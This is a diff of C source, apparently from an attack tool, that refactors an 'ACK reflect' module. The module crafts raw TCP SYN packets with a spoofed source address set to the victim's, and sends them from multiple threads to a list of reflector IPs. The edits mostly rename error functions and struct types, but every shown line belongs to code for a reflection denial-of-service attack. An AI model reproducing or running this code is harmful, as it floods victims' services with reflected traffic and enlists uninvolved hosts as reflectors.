@@ -21,18 +21,16 @@
 #include <signal.h>
 
 #include "../main.h"
-#include "../debug.h"
-
 #include "ack_reflect.h"
 
-static int SendSYN(const pSYNStruct ss, const int debug_level)
+static int SendSYN(const pSynFloodSt st, const int debug_level)
 {
     // this belong to the ack reflect attack part
     /*
     int socket_fd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
     if (socket_fd < 0)
     {
-        ErrorMessage("Create socket failed: %s(%d)", strerror(errno), errno);
+        error("Create socket failed: %s(%d)", strerror(errno), errno);
         if (errno == 1)
         {
             DebugMessage("This program should run as root user");
@@ -53,7 +51,7 @@ static int SendSYN(const pSYNStruct ss, const int debug_level)
     //TCP header
     struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct ip));
     struct sockaddr_in sin;
-    struct pseudo_header psh;
+    struct pseudo_header_tcp psh;
 
     //strcpy(source_ip, "192.168.1.1");
     sin.sin_family = AF_INET;
@@ -67,7 +65,7 @@ static int SendSYN(const pSYNStruct ss, const int debug_level)
     //memset(datagram, 0, 4096);
     if (!memset(datagram, 0, 4096))
     {
-        ErrorMessage("Attack memset failed");
+        error("Attack memset failed");
         return 1;
     }
 
@@ -122,18 +120,18 @@ static int SendSYN(const pSYNStruct ss, const int debug_level)
 
     if (!memcpy(&psh.tcp, tcph, sizeof(struct tcphdr)))
     {
-        ErrorMessage("Attack memcpy failed");
+        error("Attack memcpy failed");
         return 1;
     }
 
-    tcph->check = CalculateSum((unsigned short *)&psh, sizeof(struct pseudo_header));
+    tcph->check = CalculateSum((unsigned short *)&psh, sizeof(struct pseudo_header_tcp));
 
     // IP_HDRINCL to tell the kernel that headers are included in the packet
     int one = 1;
     const int *val = &one;
     if (setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
     {
-        ErrorMessage("Error setting IP_HDRINCL: %s(%d)", strerror(errno), errno);
+        error("Error setting IP_HDRINCL: %s(%d)", strerror(errno), errno);
         //exit(0);
         return 1;
     }
@@ -142,7 +140,7 @@ static int SendSYN(const pSYNStruct ss, const int debug_level)
     int len = sizeof(int);
     if (setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, &flag, len) < 0)
     {
-        ErrorMessage("Error setting SO_REUSEADDR: %s(%d)", strerror(errno), errno);
+        error("Error setting SO_REUSEADDR: %s(%d)", strerror(errno), errno);
         //exit(0);
         return 1;
     }
@@ -159,7 +157,7 @@ static int SendSYN(const pSYNStruct ss, const int debug_level)
                 (struct sockaddr *)&sin, // socket addr, just like in
                 sizeof(sin)) < 0)        // a normal send()
         {
-            ErrorMessage("Attack send failed");
+            error("Attack send failed");
             //break;
         }
     }
@@ -171,7 +169,7 @@ static int SendSYN(const pSYNStruct ss, const int debug_level)
     return 0;
 }
 
-static void FreeSYNStructBuff(pSYNStruct input)
+static void FreeSYNStructBuff(pSynFloodSt input)
 {
     // free the structure
     if (input)
@@ -184,7 +182,7 @@ static void FreeSYNStructBuff(pSYNStruct input)
     }
 }
 
-static int AttackThread(pSYNStruct syn_struct)
+static int AttackThread(pSynFloodSt syn_struct)
 {
     // now we start the syn flood attack
 
@@ -201,7 +199,7 @@ static int AttackThread(pSYNStruct syn_struct)
         // in here, we deal with the ip list
         if (!SplitUrl(str_node->str, &split_result))
         {
-            ErrorMessage("AttackThread SplitUrl failed");
+            error("AttackThread SplitUrl failed");
             return 1;
         }
 
@@ -216,7 +214,7 @@ static int AttackThread(pSYNStruct syn_struct)
         {
             if (strlen(split_result->host) == 0)
             {
-                ErrorMessage("AttackThread SplitUrl not right");
+                error("AttackThread SplitUrl not right");
                 return 1;
             }
             // make the port as default
@@ -226,17 +224,17 @@ static int AttackThread(pSYNStruct syn_struct)
         syn_struct->dst_ip = (char *)malloc(IP_BUFFER_SIZE);
         if (!(syn_struct->dst_ip))
         {
-            ErrorMessage("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
+            error("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
             return 1;
         }
         if (!memset(syn_struct->dst_ip, 0, IP_BUFFER_SIZE))
         {
-            ErrorMessage("AttackThread memset failed: %s(%d)", strerror(errno), errno);
+            error("AttackThread memset failed: %s(%d)", strerror(errno), errno);
             return 1;
         }
         if (!strncpy(syn_struct->dst_ip, split_result->host, strlen(split_result->host)))
         {
-            ErrorMessage("AttackThread strncpy failed: %s(%d)", strerror(errno), errno);
+            error("AttackThread strncpy failed: %s(%d)", strerror(errno), errno);
             return 1;
         }
         syn_struct->dst_port = split_result->port;
@@ -249,7 +247,7 @@ static int AttackThread(pSYNStruct syn_struct)
         {
             if (SendSYN(syn_struct, syn_struct->debug_level))
             {
-                ErrorMessage("AttackThread Attack failed");
+                error("AttackThread Attack failed");
                 return 1;
             }
         }
@@ -282,7 +280,7 @@ int StartACKReflectAttack(const pParameter input)
 
     if (!ProcessACKIPListFile(&str_header))
     {
-        ErrorMessage("ProcessACKIPListFile failed");
+        error("ProcessACKIPListFile failed");
         return 1;
     }
 
@@ -292,14 +290,14 @@ int StartACKReflectAttack(const pParameter input)
     // make the source ip as the target ip address
     if (!SplitUrl(input->address, &split_result))
     {
-        ErrorMessage("AttackThread SplitUrl failed");
+        error("AttackThread SplitUrl failed");
         return 1;
     }
     if (split_result->port == 0)
     {
         if (strlen(split_result->host) == 0)
         {
-            ErrorMessage("AttackThread SplitUrl not right");
+            error("AttackThread SplitUrl not right");
             return 1;
         }
         // make the port as default
@@ -309,17 +307,17 @@ int StartACKReflectAttack(const pParameter input)
     syn_struct->src_ip = (char *)malloc(IP_BUFFER_SIZE);
     if (!(syn_struct->src_ip))
     {
-        ErrorMessage("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
+        error("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
         return 1;
     }
     if (!memset(syn_struct->src_ip, 0, IP_BUFFER_SIZE))
     {
-        ErrorMessage("AttackThread memset failed: %d(%s)", strerror(errno), errno);
+        error("AttackThread memset failed: %d(%s)", strerror(errno), errno);
         return 1;
     }
     if (!strncpy(syn_struct->src_ip, input->address, strlen(input->address)))
     {
-        ErrorMessage("AttackThread copy SRC_ADDRESS failed: %s(%d)", strerror(errno), errno);
+        error("AttackThread copy SRC_ADDRESS failed: %s(%d)", strerror(errno), errno);
         return 1;
     }
     syn_struct->src_port = (int)split_result->port;
@@ -330,7 +328,7 @@ int StartACKReflectAttack(const pParameter input)
     pIPList_Thread list, tmp_list;
     if (!SplitIPForThread(&list, input, str_header))
     {
-        ErrorMessage("SplitIPForThread failed");
+        error("SplitIPForThread failed");
         return 1;
     }
     // str_header no longer used
@@ -352,13 +350,13 @@ int StartACKReflectAttack(const pParameter input)
             //input->serial_num = (i * input->max_thread) + j;
             if (pthread_attr_init(&attr))
             {
-                ErrorMessage("StartSYNFlood pthread_attr_init failed");
+                error("StartSYNFlood pthread_attr_init failed");
                 return 1;
             }
             //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
             if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
             {
-                ErrorMessage("StartSYNFlood pthread_attr_setdetachstate failed");
+                error("StartSYNFlood pthread_attr_setdetachstate failed");
                 return 1;
             }
             // create thread
@@ -369,7 +367,7 @@ int StartACKReflectAttack(const pParameter input)
             if (ret != 0)
             {
                 ShowMessage(DEBUG, input->debug_mode, "ret: %d", ret);
-                ErrorMessage("Create pthread failed");
+                error("Create pthread failed");
                 return 1;
             }
             pthread_attr_destroy(&attr);
@@ -411,7 +409,7 @@ int StartACKReflectTest(const pParameter input)
 
     if (!ProcessACKIPListFile(&str_header))
     {
-        ErrorMessage("ProcessACKIPListFile failed");
+        error("ProcessACKIPListFile failed");
         return 1;
     }
 
@@ -421,14 +419,14 @@ int StartACKReflectTest(const pParameter input)
     // make the source ip as the target ip address
     if (!SplitUrl(input->address, &split_result))
     {
-        ErrorMessage("AttackThread SplitUrl failed");
+        error("AttackThread SplitUrl failed");
         return 1;
     }
     if (split_result->port == 0)
     {
         if (strlen(split_result->host) == 0)
         {
-            ErrorMessage("AttackThread SplitUrl not right");
+            error("AttackThread SplitUrl not right");
             return 1;
         }
         // make the port as default
@@ -438,17 +436,17 @@ int StartACKReflectTest(const pParameter input)
     syn_struct->src_ip = (char *)malloc(IP_BUFFER_SIZE);
     if (!(syn_struct->src_ip))
     {
-        ErrorMessage("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
+        error("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
         return 1;
     }
     if (!memset(syn_struct->src_ip, 0, IP_BUFFER_SIZE))
     {
-        ErrorMessage("AttackThread memset failed: %d(%s)", strerror(errno), errno);
+        error("AttackThread memset failed: %d(%s)", strerror(errno), errno);
         return 1;
     }
     if (!strncpy(syn_struct->src_ip, input->address, strlen(input->address)))
     {
-        ErrorMessage("AttackThread copy SRC_ADDRESS failed: %s(%d)", strerror(errno), errno);
+        error("AttackThread copy SRC_ADDRESS failed: %s(%d)", strerror(errno), errno);
         return 1;
     }
     syn_struct->src_port = (int)split_result->port;
@@ -459,7 +457,7 @@ int StartACKReflectTest(const pParameter input)
     pIPList_Thread list;
     if (!SplitIPForThread(&list, input, str_header))
     {
-        ErrorMessage("SplitIPForThread failed");
+        error("SplitIPForThread failed");
         return 1;
     }
     pIPList_Thread tmp_list = list;
